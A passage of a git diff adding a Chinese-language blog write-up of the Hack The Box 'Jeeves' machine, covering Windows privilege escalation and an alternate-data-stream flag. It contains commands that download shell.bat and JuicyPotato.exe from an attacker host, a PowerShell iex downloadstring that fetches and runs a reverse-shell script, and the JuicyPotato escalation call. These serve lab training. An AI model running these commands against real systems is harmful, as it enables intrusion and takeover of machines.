class="line"></span><br><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt; dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is BE50-B1C9</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">11/08/2017  10:05 AM    &lt;DIR&gt;          .</span><br><span class="line">11/08/2017  10:05 AM    &lt;DIR&gt;          ..</span><br><span class="line">12/24/2017  03:51 AM                36 hm.txt</span><br><span class="line">11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk</span><br><span class="line">               2 File(s)            833 bytes</span><br><span class="line">               2 Dir(s)   7,377,313,792 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; type hm.txt</span><br><span class="line">The flag is elsewhere.  Look deeper.</span><br><span class="line">C:\Users\Administrator\Desktop&gt; dir /R</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is BE50-B1C9</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">11/08/2017  10:05 AM    &lt;DIR&gt;          .</span><br><span class="line">11/08/2017  10:05 AM    &lt;DIR&gt;          ..</span><br><span class="line">12/24/2017  03:51 AM                36 hm.txt</span><br><span class="line">                                    34 hm.txt:root.txt:$DATA</span><br><span class="line">11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk</span><br><span class="line">               2 File(s)            833 bytes</span><br><span class="line">               2 Dir(s)   7,377,313,792 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; type hm.txt:root.txt:$DATA</span><br><span class="line">The filename, directory name, or volume label syntax is incorrect.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; more &lt; hm.txt:root.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="方式2："><a href="#方式2：" class="headerlink" title="方式2："></a>方式2：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\kohsuke\Documents&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">============================= ========================================= ========</span><br><span class="line">SeShutdownPrivilege           Shut down the system                      Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeUndockPrivilege             Remove computer from docking station      Disabled</span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                      Disabled</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>有SeImpersonatePrivilege 权限，可以用JuicyPotato提权</p>
+<p>使用IWR命令传输shell.bat和JuicyPotato</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iwr http://10.10.14.18:808/shell.bat -o shell.bat</span><br><span class="line">iwr http://10.10.14.18:808/JuicyPotato.exe -o jp.exe </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_H3v1VgojFP.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_H3v1VgojFP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -c iex(new-object net.webclient).downloadstring(&#x27;http://10.10.14.18:808/Invoke-PowerShellTcp7788.ps1&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &#x27;jp.exe -t t -l 1234 -p shell.bat&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_wmCJvyP39b.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/bzyfjb/image//blog/image_wmCJvyP39b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+</div><div class="story post-story"><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html" title="https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html">https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43851945/article/details/104248919" title="https://blog.csdn.net/weixin_43851945/article/details/104248919">https://blog.csdn.net/weixin_43851945&#x2F;article&#x2F;details&#x2F;104248919</a></p>
+
+</div>
+  </div>
   
+  
+    
+    <div class='footer'>
+      
+      
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-07-13T13:53:06+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2022年7月13日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Hackthebox/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Hackthebox</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/windows/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>windows</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/jenkins/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>jenkins</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/potato/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>potato</p></a></div>
+  <span hidden itemprop="keywords">Hackthebox windows jenkins potato</span>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/07/13/HTB-Jeeves/&title=HTB:Jeeves - Study notes&summary="
+          
+          >
+          
+            <img src="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/07/13/HTB-Jeeves/&title=HTB:Jeeves - Study notes&summary="
+          
+          >
+          
+            <img src="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/07/13/HTB-Jeeves/&title=HTB:Jeeves - Study notes&summary="
+          
+          >
+          
+            <img src="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2022/06/29/hello-world/'>
+          <p class='title'>Hello World<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any ...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+  
+  <article class="post white-box reveal shadow floatable blur" id="comments">
+    <span hidden>
+      <meta itemprop="discussionUrl" content="/2022/07/13/HTB-Jeeves/index.html#comments">
+    </span>
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
+    
+    
+    <div id="layoutHelper-comments"></div>
+
+  </article>
+  
+
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2511,9 +2778,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 
-  <div class="pjax">
-    <!-- pjax占位 -->
-  </div>
+  <section class="widget toc-wrapper shadow floatable blur desktop mobile pjax" id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#information"><span class="toc-text">information</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-80"><span class="toc-text">WEB-80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-50000"><span class="toc-text">WEB-50000</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-kohsuke"><span class="toc-text">shell as kohsuke</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-Administrator"><span class="toc-text">shell as Administrator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F1%EF%BC%9A"><span class="toc-text">方式1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F2%EF%BC%9A"><span class="toc-text">方式2：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-text">参考：</span></a></li></ol>
+    </div>
+  </section>
 
   
 
@@ -2555,13 +2832,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -3724,7 +4002,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Study notes","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"bzyfjb","image":{"@type":"ImageObject","url":"https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Study notes"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Study notes","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"bzyfjb","image":{"@type":"ImageObject","url":"https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Study notes","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Study notes","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"bzyfjb","image":{"@type":"ImageObject","url":"https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Study notes"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/Hackthebox/","name":"Hackthebox"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/07/13/HTB-Jeeves/","name":"HTB:Jeeves"}}]},{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB:Jeeves","description":"","datePublished":"2022-07-13T05:24:46.000Z","dateModified":"2022-07-13T05:53:06.928Z","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/07/13/HTB-Jeeves/"},"author":{"@type":"Person","name":"bzyfjb","image":{"@type":"ImageObject","url":"https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Study notes","logo":{"@type":"ImageObject","url":"https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/07/13/HTB-Jeeves/","wordCount":0,"articleSection":"Hackthebox","keywords":"Hackthebox,windows,jenkins,potato","image":{"@type":"ImageObject","url":"https://npm.elemecdn.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
